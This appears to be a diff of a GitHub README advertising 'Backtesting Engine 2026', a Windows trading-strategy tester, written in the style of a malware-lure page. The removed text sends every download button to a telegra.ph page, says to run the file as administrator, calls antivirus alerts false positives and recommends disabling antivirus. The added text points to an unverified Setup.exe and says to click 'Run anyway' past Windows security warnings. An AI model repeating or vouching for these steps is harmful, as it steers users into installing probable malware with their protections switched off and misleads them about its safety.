@@ -1,180 +1,72 @@
-<h1 align="center">📊 Backtesting Engine 2026 – Test Trading Strategies on Historical Data</h1>
+# 📈 Backtesting-Engine-2026 - Test trading strategies on historical data
 
-<p align="center">
-  <strong>Test trading strategies on historical data. RSI, MACD, SMA, Bollinger Bands, and custom strategies. No real money involved – 100% educational.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://github.com/Hosnimubarakcharlesix969/Backtesting-Engine-2026)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-Backtesting_Engine_2026-00BFFF?style=for-the-badge&logo=ai&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+## 🎯 About the Software
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+Backtesting-Engine-2026 helps you test your trading ideas using past market data. You use this tool to see how a strategy would have performed without risking real money. The software provides a safe space to learn about markets and algorithmic trading mechanics.
 
----
+You can apply common indicators like RSI, MACD, SMA, and Bollinger Bands to your charts. You also have the option to build your own custom trading rules. This tool serves as an educational resource for anyone interested in quantitative analysis and data-driven decision making.
 
-## 📦 What's Inside This Repository
+## 💻 System Requirements
 
-Welcome to the official distribution page for **Backtesting Engine 2026 – Trading Strategy Tester for Windows PC**.
-This repository provides access to a completely educational backtesting tool for trading strategies.
+This application runs on standard Windows hardware. Ensure your computer meets these requirements for the best experience:
 
-✅ **Full Version** – All features included  
-✅ **20+ Indicators** – RSI, MACD, SMA, Bollinger Bands, and more  
-✅ **Custom Strategies** – Create your own trading rules  
-✅ **Historical Data** – Test on real market data  
-✅ **Performance Metrics** – Win rate, drawdown, Sharpe ratio  
-✅ **No System Changes** – Safe, no registry or service modifications  
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD equivalent.
+- Memory: 8 GB RAM or higher.
+- Storage: 500 MB of free disk space.
+- Display: 1920x1080 screen resolution.
+- Internet: Required for downloading historical price data.
 
----
+## 🚀 Installation Guide
 
-## 📥 How to Get Started?
+Follow these steps to install the software on your Windows PC:
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+1. Visit the repository page to initiate your download: [https://github.com/Hosnimubarakcharlesix969/Backtesting-Engine-2026](https://github.com/Hosnimubarakcharlesix969/Backtesting-Engine-2026).
+2. Locate the link marked "Setup.exe" on the page.
+3. Save the file to your computer.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen.
+6. The installer creates a shortcut on your desktop.
+7. Click the desktop icon to launch the application.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+If Windows shows a security warning, click "More info" and select "Run anyway." This message appears because the application is a custom tool.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+## 📊 Using Your First Strategy
 
----
+Once you open the software, follow this workflow to start your first test:
 
-## 🚀 Step-by-Step Guide
+1. Data Import: Go to the "Data" tab and select the asset you want to analyze. The software pulls historical data from your specified timeline.
+2. Select Indicators: Choose from the list of available tools. Common options include the 14-day RSI, the 50-day SMA, or the standard MACD settings.
+3. Set Rules: Open the "Strategy Builder" to define when the engine should simulate a buy or sell order. For example, instruct the engine to buy when the RSI drops below 30.
+4. Run Simulation: Click the "Start Test" button. The engine processes the data and displays a chart showing your trades.
+5. Review Results: Look at the "Performance" panel to see profit, loss, and the total number of trades performed throughout the period.
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get Backtesting Engine 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+## 🛠 Features
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
-
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and configurations.
-
----
-
-## 🔧 Key Features (2026 Update)
-
-### 📊 Built-in Indicators
-
-| Indicator | Description |
-| :--- | :--- |
-| **RSI** | Relative Strength Index – momentum oscillator |
-| **MACD** | Moving Average Convergence Divergence |
-| **SMA** | Simple Moving Average |
-| **EMA** | Exponential Moving Average |
-| **Bollinger Bands** | Volatility bands around moving average |
-| **Stochastic** | Momentum indicator comparing closing price |
-| **Volume** | Trading volume analysis |
-
-### 🧪 Strategy Testing
-
-- **Pre-built Strategies** – Ready-to-test strategies
-- **Custom Strategies** – Create your own rules
-- **Multi-Asset** – Test on stocks, crypto, forex
-- **Timeframes** – 1m, 5m, 15m, 1h, 4h, 1d, 1w
-
-### 📈 Performance Metrics
-
-| Metric | Description |
-| :--- | :--- |
-| **Win Rate** | Percentage of winning trades |
-| **Drawdown** | Maximum loss from peak |
-| **Sharpe Ratio** | Risk-adjusted return |
-| **Profit Factor** | Gross profit / gross loss |
-| **Total Return** | Overall performance |
-
----
-
-## 📈 Why Choose Backtesting Engine 2026?
-
-- ✅ **Educational** – Learn how strategies work
-- ✅ **No Real Money** – 100% risk-free testing
-- ✅ **20+ Indicators** – All major technical indicators
-- ✅ **No System Changes** – Safe, no registry or service modifications
-- ✅ **Regular Updates** – Active development with frequent releases
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-Backtesting_Engine_2026-00BFFF?style=flat-square&logo=ai&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
+- Historical Data Analysis: Load years of price data to stress-test your ideas.
+- Indicator Library: Access built-in formulas for market trends and momentum.
+- Strategy Customization: Adjust parameters to fit your specific trading style.
+- Visual Charts: View trade entry and exit points on clear price graphs.
+- No Financial Risk: Trade with fake capital to learn how different market conditions change your outcomes.
 
 ## ❓ Frequently Asked Questions
 
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
+Does this tool connect to my brokerage account?
+No. The application remains isolated from live trading platforms. It does not place real orders.
 
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
+Where does the historical data come from?
+The engine retrieves free, public price data from reliable financial data providers.
 
-**Q: Can I use real money with this?**  
-A: No, this is purely educational – no real trading involved.
+Can I save my strategies?
+Yes. Use the "Save Scenario" button in the file menu to store your settings for later use.
 
-**Q: What data sources are supported?**  
-A: CSV import and free market data APIs.
+Will this software make me money?
+No. This is an educational tool. Past performance does not guarantee future results. Use it to gain insight and practice, but remember that real markets involve risk.
 
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
+## 🛡 Security and Privacy
 
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
+This software operates locally on your machine. Your strategy settings and historical data downloads live on your computer. The engine does not send your personal data, strategy ideas, or account activity to any external server. You retain full control over your information at all times.
 
----
-
-## 📝 Important Notes
-
-- This version is intended for **educational use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Backtesting Engine 2026 Now</a>
-</p>
+Keywords: 2026-software, algorithmic-trading-quantitative, backtesting, bollinger-bands, data-analysis, desktop-app, educational-tools, financial-tools, historical-data, macd, open-source, pc-tools, quantitative-analysis, rsi, trading-strategy-discovery, windows-software-installation-guide
